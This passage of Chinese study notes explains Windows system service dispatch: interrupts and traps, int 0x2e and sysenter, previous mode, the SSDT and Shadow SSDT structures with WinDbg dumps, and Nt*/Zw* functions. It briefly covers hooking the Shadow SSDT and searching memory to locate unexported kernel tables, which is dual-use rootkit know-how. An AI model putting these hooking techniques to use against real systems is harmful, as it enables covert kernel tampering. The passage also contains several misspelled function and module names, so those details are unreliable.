<li><strong>中断</strong>是一个<mark class="label primary">异步</mark>事件（可以在任何时候发生），并且与处理器当前正在执行的任务毫无关系。中断主要是由I&#x2F;O设备、处理器时钟或者定时器产生的，并且可以被启用（打开）或者禁用（关闭）。<ul>
<li>I&#x2F;O设备；</li>
<li>处理器时钟；</li>
<li>定时器。</li>
</ul>
</li>
<li><strong>异常</strong>是一个<mark class="label primary">同步</mark>条件，它往往是一个特殊指令执行的结果。（中止（abort）-- 比如机器检查，是一种典型的不与指令执行有关联的处理器异常。）在同样的条件下用同样的数据第二次运行程序可以重现原来的异常。异常的例子有（内核把系统服务调用看作是异常，不过，从技术上讲，它们是系统陷阱。）：<ul>
<li>内存访问违例；</li>
<li>特定的调试器指令；</li>
<li>除零错误；</li>
<li><mark class="label warning">系统服务调用</mark>。</li>
</ul>
</li>
</ul>
</div>

<div class="note danger"><p><mark class="label info">无论是硬件还是软件都能够产生异常和中断</mark>。例如，总线错误异常是由于硬件问题引起的，而除零异常则是软件错误的结果。同样，I&#x2F;O设备可以产生中断，内核本身也可以发出软中断（比如 APC 或者 DPC）。</p>
<ol>
<li><p>（硬中断）当硬件异常或者中断产生时：</p>
<ul>
<li><strong>内核模式下</strong>：处理器将在被中断的线程的内核栈中记录下足够多的机器状态信息，因而可以回到控制流中的该点处继续执行，就好像什么也没有发生过一样。</li>
<li><strong>用户模式下</strong>：如果该线程在用户模式下执行，那么 Windows 就<strong>切换到该线程的内核模式栈</strong>。然后，Windows 在被中断线程的内核栈上创建一个陷阱栈帧（trap frame），并且把线程的执行状态保存到陷阱帧里。陷阱帧是一个线程的完整执行环境的一个子集，在内核调试器中输入<code>dtnt!_trap_frame</code>就可以看到陷阱帧的定义。（<strong>即从用户模式切换到内核模式，同时栈帧也从用户模式切换到内核模式</strong>）。</li>
</ul>
</li>
<li><p>（软中断，即异常）</p>
<p>内核在处理软中断时，或者将软中断当作硬中断处理的一部分，或者当线程调用与软中断相关的内核函数时以同步方式（即异常）进行处理。</p>
</li>
</ol>
</div>

<p><strong>陷阱分发：</strong></p>
<p>在大多数情况下，内核安装了前端陷阱处理函数（陷阱分发处理器），在内核将控制权转交给与特定陷阱相关的处理函数之前或者之后，由这些前端陷阱处理函数来执行一些常规的陷阱处理任务（陷阱分发）。例如：</p>
<ul>
<li>如果陷阱条件是一个设备中断，则内核的硬件中断陷阱处理器（函数）将控制权转交给一个由设备驱动程序提供给该中断设备的中断服务例程（ISR，interrupt service routine）。</li>
<li>如果陷阱条件是因为调用一个<strong>系统服务而引发</strong>的，那么，通用的系统服务陷阱处理器将控制权转交给<strong>执行体中指定的系统服务函数</strong>（系统服务分发器）。</li>
<li>内核也会为它不希望看到的或者根本不处理的陷阱安装陷阱处理器。这些陷阱处理器一般的做法是执行系统函数<code>KebugCheckEx</code>，当内核检测到可能导致数据破坏的有问题行为或者不正确行为时，该函数会停止计算机</li>
</ul>
<h4 id="2-3-6-系统服务分发"><a href="#2-3-6-系统服务分发" class="headerlink" title="2.3.6 系统服务分发"></a>2.3.6 系统服务分发</h4><p><img data-src="https://img.shields.io/badge/%E3%80%8A%E6%B7%B1%E5%85%A5%E8%A7%A3%E6%9E%90Windows%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%AC%AC6%E7%89%88%E3%80%8B-3.1%E7%B3%BB%E7%BB%9F%E6%9C%8D%E5%8A%A1%E5%88%86%E5%8F%91-1fd0f6.svg?colorA=ff69b4"></p>
<p><img data-src="https://img.shields.io/badge/%E3%80%8AWindows%E5%86%85%E6%A0%B8%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%9E%E7%8E%B0%E3%80%8B-8.1.3Windows%E7%B3%BB%E7%BB%9F%E6%9C%8D%E5%8A%A1%E5%88%86%E5%8F%91-1fd0f6.svg?colorA=ff69b4"></p>
<p><strong>系统服务分发</strong>（System Service Dispatching）：内核中接收到合法的应用程序（用户模式的ntdll）调用时，根据<code>ntdll.dll    </code>中的系统服务存根函数指定的<mark class="label danger">系统服务号</mark>，在内核模式下，<code>KiSystemServiceRepeat</code>根据此系统服务号，知道该调用内核中哪个系统服务例程，以及从用户栈拷贝多少数据到内核栈中，然后执行该系统服务。</p>
<ul>
<li>接收系统服务号的是<mark class="label danger">系统服务分发器</mark>，然后根据系统服务号决定系统去执行哪一个系统服务。</li>
</ul>
<div class="note warning"><p>处理器一旦被中断，就会询问中断控制器以获得此中断请求（IRQ， Interrupt request）。中断控制器将该 IRQ 转译成一个<mark class="label info">中断号</mark>，利用该编号作为索引，在一个称为<strong>中断分发表</strong>（<mark class="label info">IDT</mark>，Interrupt dispatch table）的结构中找到一个IDT项，并且将控制权传递给恰当的中断分发器（例程）。在系统引导的时候，Windows会填充IDT，其中包含了指向负责处理每个中断和异常的内核器（例程）的指针。</p>
<p>Windows将硬件IRQ映射至IDT中的中断号上，同时利用IDT来为异常配置陷阱处理器，然后进行陷阱分发。</p>
</div>

<div class="note primary"><p><strong>硬中断和异常都会产生中断号，直接对应于IDT中的表项。</strong></p>
<p>在x86和x64处理器上，所有的异常（包括系统服务调用）都有预定义的中断号，直接对应于IDT中的表项，而每个表项又指向某个特定异常的陷阱处理器。表3.6显示了x86定义的异常，以及为它们分配的中断号。因为IDT中前面的表项是用于异常的，所以，硬件中断被分配了后面的表项。</p>
</div>

<p><img data-src="https://i.loli.net/2021/05/30/ics6bmURWLJSwuq.png" alt="14.png"></p>
<p><img data-src="https://i.loli.net/2021/05/30/Nik2KQ1GEl7JeUt.png" alt="15.png"></p>
<p><strong>系统服务分发：</strong></p>
<div class="note danger"><p><strong>系统服务分发顺序：</strong></p>
<p>$$中断号45 –&gt; 查IDT表第46项 –&gt; 系统服务分发器 –&gt; 从EAX获取系统服务号 –&gt; 查SDT –&gt; 得到XXX系统服务。$$</p>
<p>CPU从用户模式切换到内核模式，需要一个进行一个陷阱处理，能触发陷阱的是ntdll.dll中的<code>int 2E</code>和<code>sysenter</code>两个指令，产生一个中断号45。Windows填充IDT的46号表项，使其指向系统服务分发器。</p>
</div>

<h5 id="部分1：int-0x2E-和-Sysenter"><a href="#部分1：int-0x2E-和-Sysenter" class="headerlink" title="部分1：int 0x2E 和 Sysenter"></a>部分1：int 0x2E 和 Sysenter</h5><mark class="label info">int 0x2e</mark><mark class="label warning">sysenter</mark>

<ul>
<li><p>在Pentium I之前的x86处理器上，Windows使用<mark class="label info">int 0x2e</mark>指令（十进制是46），它会导致一个陷阱。</p>
<ul>
<li>该陷阱导致执行线程转换到内核模式中，并且进入系统服务分发器。</li>
<li>在处理器的<mark class="label default">EAX</mark>寄存器中传递的数值参数指明了所请求的<mark class="label default">系统服务号</mark>，<mark class="label primary">由ntdll.dll的存根函数指定服务号</mark>。</li>
<li><mark class="label default">EDX</mark>寄存器指向调用者传递给该系统服务的参数列表<mark class="label default">地址</mark>。</li>
<li>要回到用户模式，系统服务分发器需要使用<code>iret</code>指令（即中断返回指令）。</li>
</ul>
</li>
<li><p>在x86 Pentium II 及更高级的处理器上，Windows使用专门的<mark class="label warning">sysenter</mark>指令（32位使用sysenter指令，x64使用syscall指令，IA64使用epc指令。），这是InteI特别为<strong>快速系统服务分发</strong>而定义的指令。</p>
<ul>
<li>为了支持这一指令， Windows在引导时将内核的系统服务分发器例程的地址保存在与该指令相关联的3个<mark class="label default">MSR</mark>（machine specific register）寄存器中。</li>
<li>该指令一旦被执行，就会导致变换到内核模式下，并且执行系统服务分发器。</li>
<li>系统服务号是通过处理器的EAX寄存器来传递的，而EDX寄存器则指向调用者参数的列表地址。</li>
<li>为了返回到用户模式，系统服务分发器通常执行<code>sysexit</code>指令。</li>
</ul>
</li>
</ul>
<div class="note warning"><p>ntdll.dll中的<code>KiIntSystemCall</code>函数执行<code>int 2e</code>，<code>KiFastSystemCall</code>执行<code>sysenter</code>指令，以便切换到内核模式下，然后由内核模式的系统服务分发函数<code>KiSystemService</code>或<code>KiFastCallEntry</code>（系统服务分发器）来调用系统服务函数。待系统服务函数执行完成以后，<code>KiSystemService </code>调用<code>KiServiceExit</code>函数，最终通过<code>iretd</code>或<code>sysexit</code>指令返回到用户模式ntdll.dll模块中。</p>
<ul>
<li>用户模式下：<ul>
<li><code>SystemCall</code> --&gt; <code>KiIntSystemCall</code> --&gt; <code>int 2e</code>；</li>
<li><code>SystemCall</code>  --&gt; <code>KiFastSystemCall</code>--&gt; <code>sysenter</code>。</li>
</ul>
</li>
<li>内核模式下：<ul>
<li><code>KiIntSystemCall</code> --&gt; <code>int 2e</code> --&gt; <code>KiSystemService</code> --&gt; 系统服务函数 --&gt; <code>KiServiceExit</code> --&gt; <code>iretd</code> --&gt; 返回用户模式；</li>
<li><code>KiFastSystemCall</code>--&gt; <code>sysenter</code> --&gt; <code>KiFastCallEntry</code> --&gt; 系统服务函数 --&gt; <code>KiServiceExit2</code> --&gt; <code>sysexit</code> --&gt; 返回用户模式。</li>
</ul>
</li>
</ul>
<p><code>SystemCall</code>和<code>SystemCallReturm</code>成员：</p>
<ul>
<li>这是两个<mark class="label default">函数地址</mark>，<code>SystemCall</code>成员指示了从用户模式切换至内核模式的函数地址；<code>SystemCallReturn</code>成员指示了从内核模式返回至用户模式的函数地址。</li>
<li>当处理器支持快速系统调用时，SystemCall成员指向<code>KiFastSystemCall</code>函数，<code>SystemCallReturn</code>成员指向<code>KiFastSystemCallRet</code>函数；否则，<code>SystemCall</code>成员指向<code>KiIntSystemCall</code>函数。</li>
</ul>
</div>

<p>在切换至内核模式以前，edx寄存器指向用户栈中的某个位置。显然，edx的用意是向内核模式的系统服务函数传递有关参数的信息。内核中哪个函数被执行呢（<mark class="label primary">指定哪个系统分发器</mark>）？</p>
<ul>
<li>如果是由<code>int 2e</code>指令进入的，则<code>KiSystemService</code>（<mark class="label default">系统服务分发器</mark>）函数获得控制权，这是在IDT的<code>0x2e</code>项中指定的；</li>
<li>如果是借由<code>syenter</code>指令跳转过来的，则<code>KiFastCallEntry</code>（<mark class="label default">系统服务分发器</mark>）函数获得控制权，这是由MSR寄存器<code>IA32_SYSENTER_EIP</code>指定的。</li>
</ul>
<h5 id="部分2：原先模式"><a href="#部分2：原先模式" class="headerlink" title="部分2：原先模式"></a>部分2：原先模式</h5><p>系统服务分发器将调用者的参数从线程的用户模式栈中复制到内核模式找中（所以，当内核在访问参数时，用户不能改变它们），然后执行该系统服务。内核知道要从栈中复制多少字节，因为它使用了第二个表， 称为参数表<mark class="label default">SSPT</mark>。参数表是一个<mark class="label warning">字节数组</mark>（而并非像服务分发表那样是一个<mark class="label warning">指针数组</mark>），每一项描述了要复制的字节数。在64位系统上，Windows通过一个称为<strong>系统调用表缩紧</strong>（system call table compaction）的过程，将这一信息实际编码在服务表内部。如果传递给一个系统服务的参数指向了用户空间中的缓冲区，那么，内核模式的代码在复制数据到这些缓冲区中，或者从缓冲区中复制数据以前，必须要先探查这些缓冲区是否是可以访问的。只有当线程的原先模式（previous mode）属性被设置为用户模式，才会执行缓冲区探查工作。</p>
<mark class="label warning">原先模式</mark>：是内核在执行陷阱处理器时保存在线程中的一个值（内核或用户），<mark class="label info">代表了这一进来的异常、陷阱或系统调用是从哪个特权级别（R3/R0）进来的</mark>。作为一项优化措施：

<ul>
<li>如果一个系统调用来自于<strong>驱动程序</strong>或<strong>内核本身</strong>，则对参数的探查和异常捕获可以忽略，所有的参数都假定指向有效的内核模式缓冲区(而且，访问内核模式数据也是允许的)。调用者已经在内核模式下了，不需要<code>中断</code>或<code>sysenter</code>操作CPU已经在正确的特权级上了，而且，驱动程序和内核一样， 应该只能直接调用所请求的函数。<ul>
<li>但如果直接像调用API一般直接调用<code>NtOpenProcess</code>之类的系统服务函数时，内核保存的原先模式值仍然是用户模式（进内核之前当然是用户模式咯~），但又检测到传递来的地址是一个内核模式地址（因为在当前内核模式下调用），于是会导致调用失败（<code>STATUS_ACCESS_VIOLATION</code>）。</li>
</ul>
</li>
<li>如果原先模式为用户模式，在给系统服务传递的参数指向了用户空间缓冲区时，内核模式代码在操作该缓冲区前会检查是否可以访问该缓冲区。</li>
</ul>
<h5 id="部分3：SSDT-和-Shadow-SSDT"><a href="#部分3：SSDT-和-Shadow-SSDT" class="headerlink" title="部分3：SSDT 和 Shadow SSDT"></a>部分3：SSDT 和 Shadow SSDT</h5><p>ntdll.dll中的系统服务存根函数调用<code>int 2e</code>或<code>sysenter</code>产生中断（<mark class="label danger">中断号</mark>），同时存根函数指定一个<mark class="label primary">系统服务号</mark>。一个存根函数对应一个系统服务号。 </p>
<div class="note info"><p>系统服务分发过程中有两个重要的系统服务分发表，在 NT 4.0 以上的 Windows 操作系统中（Windows 2000），默认就存在两个系统服务描述表，这两个调度表对应了两类不同的系统服务，这两个调度表为：</p>
<ul>
<li><p><mark class="label danger">SSDT：</mark><mark class="label success">KeServiceDescriptorTable</mark></p>
</li>
<li><p><mark class="label danger">ShadowSSDT：</mark><mark class="label success">KeServiceDescriptorTableShadow</mark></p>
</li>
</ul>
<ol>
<li><code>KeServiceDeseriptorTable</code>定义了<code>Ntoskrnl.exe</code>中实现的核心执行体系统服务。<code>KeSericeDescriptorTableShadow</code>包含了在Windows子系统的内核模式部分<code>Win32k.sys</code>中实现的Windows USER和GDI服务。</li>
<li>针对Windows执行体服务的系统服务分发指令位于系统库ntdll.dll中。子系统DLL调用 Ntdll.dll中的函数来实现其已文档化的函数。只有Windows USER和GDI函数例外，在这些函数中，系统服务分发指令是直接在User32.dII和Gdi32.dll中实现的，没有涉及Ntdll.dll。</li>
<li>在32位和IA64版本的Windows 上，当Windows线程第一次调用Windows USER或GDI服务时，该线程的系统服务表的地址被改变成指向个包含Windows USER和GDI服务的表。KeaddSystemerviceTable 函数使Win32k.sys可以增加一个系统服务表。</li>
<li>win32k.sys只有在GUI线程中才加载，一般情况下是不加载的，所以要Hook KeServieDescriptorTableShadow的话，一般是用一个GUI程序通过IoControlCode来触发。</li>
</ol>
</div>

<p>Windows 操作系统共有4个系统服务描述符。其中只用了两个，第一个是SSDT，第二个是ShadowSSDT。SSDT与ShadowSSDT的结构如下(参考《Undocument Windows 2000 Secretes》第二章)：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// KSYSTEM_SERVICE_TABLE 和 KSERVICE_TABLE_DESCRIPTOR</span></span><br><span class="line"><span class="comment">// 用来定义 SSDT 结构</span></span><br><span class="line"><span class="comment">/********</span></span><br><span class="line"><span class="comment">  ***</span></span><br><span class="line"><span class="comment">  KeServiceDeseriptorTable结构</span></span><br><span class="line"><span class="comment">  ***</span></span><br><span class="line"><span class="comment">*********/</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">KSYSTEM_SERVICE_TABLE</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    PULONG  *ServiceTableBase;                         <span class="comment">// SSDT (System Service Dispatch Table)的基地址</span></span><br><span class="line">    PULONG  *ServiceCounterTableBase;                  <span class="comment">// 用于 checked builds, 包含 SSDT 中每个服务被调用的次数</span></span><br><span class="line">    ULONG   NumberOfService;                           <span class="comment">// SSDT服务函数的个数, NumberOfService * 4 就是整个地址表的大小</span></span><br><span class="line">    ULONG   * ParamTableBase;                          <span class="comment">// SSPT(System Service Parameter Table)的基地址</span></span><br><span class="line">&#125; KSYSTEM_SERVICE_TABLE, *PKSYSTEM_SERVICE_TABLE;</span><br><span class="line"><span class="comment">/********</span></span><br><span class="line"><span class="comment">  ***</span></span><br><span class="line"><span class="comment">  KeServiceDeseriptorTableShadow结构</span></span><br><span class="line"><span class="comment">  ***</span></span><br><span class="line"><span class="comment">*********/</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">KSERVICE_TABLE_DESCRIPTOR</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    KSYSTEM_SERVICE_TABLE   ntoskrnl;                  <span class="comment">// ntoskrnl.exe 的服务函数</span></span><br><span class="line">    KSYSTEM_SERVICE_TABLE   win32k;                    <span class="comment">// win32k.sys 的服务函数(GDI32.dll/User32.dll 的内核支持)</span></span><br><span class="line">    KSYSTEM_SERVICE_TABLE   notUsed1;</span><br><span class="line">    KSYSTEM_SERVICE_TABLE   notUsed2;</span><br><span class="line">&#125;KSERVICE_TABLE_DESCRIPTOR, *PKSERVICE_TABLE_DESCRIPTOR;</span><br></pre></td></tr></table></figure>



<div class="note danger"><p><strong>说明：</strong></p>
<ol>
<li><p><code>KeServiceDescriptorTable</code>由ntoskrnl.exe导出和<code>KeServiceDescriptorTableShadow</code>没有导出，二者都<mark class="label default">是数组</mark>；</p>
<ul>
<li><p>系统使用的基本 SSDT，即<code>KeServiceDescriptorTable[0]</code>，<code>KeServiceDescriptorTable[1]</code>元素不使用。是在<code>KiInitsystem</code>函数中被初始化的，此 SSDT 的原始数据分别来自于内部变量<code>KiserviceTable</code>、<code>KiserviceLimit</code>和 <code>Kiargumenttable</code>，其中<code>Count</code>成员被初始化为<code>NULL</code>，参见下图。</p>
</li>
<li><p><code>KeServiceDescriptorTableShadow</code>是一个内部数组，<strong>它的第 2 个元素为ShadowSSDT</strong>，即  <code>KeServiceDescriptorTableShadow[1]</code>表项，专门用于 Windows 子系统，其他的表项与  <code>KeServiceDescriptorTable</code>完全相同。<code>KeServiceDescriptorTable[0]</code>为SSDT，<strong>但是不使用</strong>。</p>
<p><img data-src="https://i.loli.net/2021/06/08/lyvI9ojW78bs6wi.png" alt="16.png"></p>
</li>
</ul>
</li>
<li><p>SSDT、SSPT表都属于<code>KeServiceDescriptorTable</code>结构的<mark class="label default">第一和第四个元素</mark>。Shadow SSDT属于<code>KeServiceDescriptorTableShadow</code>结构的<mark class="label default">第二个元素</mark>。<strong>SSDT的函数是Native API</strong>。</p>
</li>
<li><p>SSDT是<code>KeServiceDescriptorTable</code>的第一个元素<code>ServiceTableBase</code>，且为一个数组或指针，指向ntoskrnl.dll中系统函数的<mark class="label default">入口地址</mark>。</p>
<ul>
<li><p>某个系统服务函数的地址的计算方法为：</p>
<p>$$Address &#x3D; KeServiceDescriptorTable.ServiceTableBase + 4 * 系统服务号$$</p>
</li>
</ul>
</li>
<li><p><code>KeServiceDescriptorTableShadow</code>包含4个子结构，其中第一个就是ntoskrnl.exe ( native api )，不用，我们真正需要获得的是第二个win32k.sys (gdi&#x2F;user support)，第三个和第四个一般不使用。</p>
</li>
<li><p>两者的区别是，<code>KeServiceDescriptorTable</code>仅有ntoskrnel一项，<code>KeServieDescriptorTableShadow</code>包含了ntoskrnel以及win32k。一般的Native API的服务地址由<code>KeServiceDescriptorTable</code>分派，<code>gdi.dll/user.dll</code>的内核API调用服务地址由<code>KeServieDescriptorTableShadow</code>分派。</p>
</li>
<li><p>SSDT中系统服务函数的个数随着Windows发展在不断增加，且不同版本中的系统服务函数对应的系统服务号一般不同。</p>
</li>
</ol>
</div>

<p><strong>1）</strong>对照KeServiceDescriptorTable结构，Windbg查看其结构：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">lkd&gt; dd KeServiceDescriptorTable   </span><br><span class="line"><span class="number">80563520</span>  <span class="number">804e58</span>b0 <span class="number">00000000</span> <span class="number">0000011</span>c <span class="number">805120</span>cc  <span class="comment">//804e58b0就是SSDT表的起始地址，805120cc为SSPT表的起始地址</span></span><br><span class="line"><span class="number">80563530</span>  <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span>  <span class="comment">//KeServiceDescriptorTableShadow未公开</span></span><br><span class="line"><span class="number">80563540</span>  <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line"><span class="number">80563550</span>  <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> </span><br><span class="line">...</span><br><span class="line">lkd&gt; dd <span class="number">804e58</span>b0               <span class="comment">//SSDT基址</span></span><br><span class="line"><span class="number">804e58</span>b0  <span class="number">80591b</span>fb <span class="number">80585358</span> <span class="number">805e1</span>f35 <span class="number">805</span>dbc4a</span><br><span class="line"><span class="number">804e58</span>c0  <span class="number">805e1</span>fbc <span class="number">80640</span>ce4 <span class="number">80642e75</span> <span class="number">80642</span>ebe</span><br><span class="line"><span class="number">804e58</span>d0  <span class="number">805835</span>aa <span class="number">80650b</span>e3 <span class="number">806404</span>a3 <span class="number">805e1787</span></span><br><span class="line"><span class="number">804e58</span>e0  <span class="number">806387b</span>a <span class="number">80586f</span>a3 <span class="number">805e08</span>e8 <span class="number">8062f</span>462</span><br><span class="line">...</span><br><span class="line">若sysenter的ID（系统服务号）是<span class="number">0x105</span>，对应函数ntos!NtQuerySystemInformation=<span class="number">0x804e58b0</span>+<span class="number">4</span>*<span class="number">0x105</span>=<span class="number">0x804e5cc4</span>，</span><br><span class="line">  跟踪进去：</span><br><span class="line">lkd&gt; u <span class="number">804e5</span>cc4</span><br><span class="line">nt!NtQuerySystemInformation:</span><br><span class="line"><span class="number">8464</span>ae3e  <span class="number">8b</span>ff          mov     edi,edi</span><br><span class="line"><span class="number">8464</span>ae40  <span class="number">55</span>            push    ebp</span><br><span class="line"><span class="number">8464</span>ae41  <span class="number">8b</span>ec          mov     ebp,esp</span><br><span class="line"><span class="number">8464</span>ae43  <span class="number">8b</span>5508        mov     edx,dword ptr [ebp+<span class="number">8</span>]</span><br><span class="line"><span class="number">8464</span>ae46  <span class="number">83f</span>a53        cmp     edx,<span class="number">53</span>h</span><br><span class="line"><span class="number">8464</span>ae49  <span class="number">7f</span>21          jg      nt!NtQuerySystemInformation+<span class="number">0x2e</span> (<span class="number">8464</span>ae6c)</span><br><span class="line"><span class="number">8464</span>ae4b  <span class="number">7440</span>          je      nt!NtQuerySystemInformation+<span class="number">0x4f</span> (<span class="number">8464</span>ae8d)</span><br><span class="line"><span class="number">8464</span>ae4d  <span class="number">83f</span>a08        cmp     edx,<span class="number">8</span></span><br></pre></td></tr></table></figure>

<p><strong>2）</strong>对照KeServiceDescriptorTableShadow结构，Windbg查看其结构：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">kd&gt; dd KeServiceDescriptorTableShadow  </span><br><span class="line"><span class="number">805634e0</span>  <span class="number">804e58</span>b0 <span class="number">00000000</span> <span class="number">0000011</span>c <span class="number">805120</span>cc    KeServiceDescriptorTableShadow[<span class="number">0</span>]，SSDT表 Ntoskrnel.exe，不用</span><br><span class="line"><span class="number">805634f</span>0  bf99a000 <span class="number">00000000</span> <span class="number">0000029b</span> bf99ad10    KeServiceDescriptorTableShadow[<span class="number">1</span>]，SSDT Shdow表 Win32k.sys</span><br><span class="line"><span class="number">80563500</span>  <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line"><span class="number">80563510</span>  <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line"><span class="number">80563520</span>  <span class="number">804e58</span>b0 <span class="number">00000000</span> <span class="number">0000011</span>c <span class="number">805120</span>cc       <span class="comment">//KeServiceDescriptorTable 表</span></span><br><span class="line"><span class="number">80563530</span>  <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br></pre></td></tr></table></figure>

<p>同时还发现，在XP系统下，KeServiceDescriptorTableShadow表位于KeServiceDescriptorTable表下方，偏移0x40处。</p>
<div class="note primary"><p>结论：</p>
<p>ShadowSSDT在<mark class="label info">KeServiceDescriptorTableShadow[1]</mark>中第二个元素，而<mark class="label warning">KeServiceDescriptorTableShadow[0]</mark>第一个元素为SSDT。</p>
</div>

<p><img data-src="https://i.loli.net/2021/06/10/H4BRSyMsYwj5kDT.png" alt="17.png"></p>
<p><img data-src="https://i.loli.net/2021/06/10/kV1ChfTWUFxD6ba.jpg" alt="21.jpeg"></p>
<p>参考：</p>
<ul>
<li>《<a href="https://blog.csdn.net/xuemao1230/article/details/79397553">ssdt与shadowssdt区别</a>》</li>
<li>《<a href="https://cataloc.gitee.io/blog/2020/03/27/API%E5%87%BD%E6%95%B0%E7%9A%84%E8%B0%83%E7%94%A8%E8%BF%87%E7%A8%8B%EF%BC%88%E7%B3%BB%E7%BB%9F%E6%9C%8D%E5%8A%A1%E8%A1%A8%EF%BC%89/#SharedCode%E5%88%86%E6%9E%90">API函数的调用过程（系统服务表）</a>》</li>
<li>《<a href="https://www.cnblogs.com/onetrainee/p/11717309.html">Windows系统调用中的系统服务表描述符(SSDT)</a>》</li>
</ul>
<div class="note default"><p>由于KeServiceDescriptorTableShadow表属于未导出，因此我们需要定位地址。<br>定位未导出函数和结构的思想就是利用已导出函数和结构，暴力搜索内存空间。<br>方法一、依据KeServiceDescriptorTable的地址和两者之间的偏移<br>方法二、搜索KeAddSystemServiceTable导出函数<br>方法三、搜索线程的ServiceTable指向<br>方法四、MJ提出的搜索有效内存地址</p>
</div>

<h5 id="部分4：系统服务号"><a href="#部分4：系统服务号" class="headerlink" title="部分4：系统服务号"></a>部分4：系统服务号</h5><p>系统服务号用来定位所要寻找的系统服务表的函数。</p>
<div class="note warning"><p><mark class="label info">系统服务号只有低13位是有用的</mark></p>
<ul>
<li>下标12：判断去查服务表，<mark class="label warning">0</mark>去查第一张表SSDT；<mark class="label warning">1</mark>去查第二张表ShadowSSDT</li>
<li>下标0~11：表内索引，函数地址表的索引，范围0H ~ FFFH。<ul>
<li>SSDT函数服务号范围0x00000000 ~ 0x00000FFF；</li>
<li>ShadowSSDT服务号范围0x00001000 ~ 0x00001FFF。</li>
</ul>
</li>
</ul>
</div>

<p><img data-src="https://i.loli.net/2021/06/10/fdNwZQIkgmGvE9L.png" alt="18.png"></p>
<p><img data-src="https://i.loli.net/2021/06/10/lTrgJzkQYm9ia7E.png" alt="19.png"></p>
<h5 id="部分5：系统服务分发"><a href="#部分5：系统服务分发" class="headerlink" title="部分5：系统服务分发"></a>部分5：系统服务分发</h5><p>以函数WriteFile函数为例，从R3到R0的调用过程：</p>
<ol>
<li>如图3.17所示，位于Kernel32.dll中的Windows WriteFile函数导入并调用<code>API-MS-Win-Core-File-L1-1-0.dll</code>中的NtWriteFile函数，这是一个MinWin重定向DLL；</li>
<li>这里的NtWriteFile函数又调用<code>KernelBase.dll</code>中的WriteFile函数，这才是真正的实现所在。</li>
<li>KernelBase.dll.WriteFile函数对子系统相关的参数做了检查以后，再调用<code>Ndll.dll</code>中的<code>NtWriteFile</code>函数，然后NtWriteFile函数又执行适当的指令以引发一个系统服务陷阱并且把代表<code>NtWriteFile</code>的系统服务号传递过去。</li>
<li>系统服务分发器（即Ntoskml.exe中的<code>KiSystemService</code>函数）然后调用真正的<code>nt!NtWriteFile</code>来处理该IO请求。</li>
<li>对于Windows USER和GDI函数，系统服务分发器调用Windows子系统的可加载内核模式部分（Win32k.sys）中的函数。</li>
</ol>
<div class="note danger"><p>总结为：</p>
<p><code>Kernel32.dll.WriteFile --&gt; API-MS-Win-Core-File-L1-1-0.dll.NtWriteFile --&gt; KernelBase.dll.WriteFile --&gt;  Ndll.dll.NtWriteFile --&gt; KiFastSystemCall --&gt; sysenter --&gt; KiFastCallEntry（系统服务分发器） --&gt; 查找SSDT</code></p>
<p><img data-src="https://i.loli.net/2021/06/10/rW9boQ1YBU3cmOj.png" alt="20.png"></p>
</div>

<p>过程如下：</p>
<p><img data-src="https://i.loli.net/2021/06/11/L7easlOwjvA3EZ5.png" alt="22.png"></p>
<p>上图参考《<a href="https://wenku.baidu.com/view/5e4e0bda69dc5022abea001b.html?fr=search-1-wk_es_paddle-income5&fixfr=kZolUMQwRLbkNUCGioehqw==">SSDT 及SSDT Shadow 完全解析</a>》（可下载）</p>
<ul>
<li>《<a href="https://www.cnblogs.com/uAreKongqi/p/6597701.html">浅谈系统服务分发</a>》</li>
<li>《<a href="https://blog.csdn.net/cdsntxz158/article/details/8020629">SSDT获取原始服务地址的方法与原理</a>》</li>
<li>《<a href="https://zhuanlan.zhihu.com/p/38339756">Hook原理</a>》</li>
<li>《<a href="https://cloud.tencent.com/developer/article/1471088?from=article.detail.1471284">SSDT表概念详解</a>》</li>
<li>《<a href="https://zhuanlan.zhihu.com/p/328757029">SSDT Hook底层原理介绍以及如何实现进程保护</a>》</li>
</ul>
<h5 id="部分6：Nt-和-Zw"><a href="#部分6：Nt-和-Zw" class="headerlink" title="部分6：Nt* 和 Zw*"></a>部分6：Nt* 和 Zw*</h5><p><img data-src="https://i.loli.net/2021/06/15/LxrowB1pqlZjE3g.png" alt="24-1"></p>
<p><img data-src="https://i.loli.net/2021/06/11/6zHG54kqN7icYLj.png" alt="23.png"></p>
<div class="note info"><p><strong>nt!Zw*函数是nt!Nt*的一个stub(存根)函数</strong>，只是mov系统调用号到eax中，转而直接调用nt!KiSystemService去从SSDT中找到相应号码的函数再调用之，真正的实现都在Nt*函数中。</p>
</div>

<ul>
<li><code>ntdll!Zw*</code>仅仅是<code>ntdll!*</code>函数的别名而已</li>
<li>内核模式下Nt系列API将直接调用对应的函数代码，而Zw系列API则通过KiSystemService，SSDT最终跳转到对应的NT函数代码。</li>
<li>两种不同的调用对内核中previous mode（原先模式）的改变，如果是从用户模式调用Native API则previous mode是用户态，如果从内核模式调用Native API则previous mode是内核态。previous为用户态时Native API将对传递的<strong>参数进行严格的检查</strong>，而为内核态时则不会。</li>
<li>调用用户模式Nt API时不会改变previous mode的状态，调用内核模式Zw API时会将previous mode改为内核态，因此在进行Kernel Mode Driver开发时可以使用内核模式Zw系列API可以避免额外的参数列表检查，提高效率。</li>
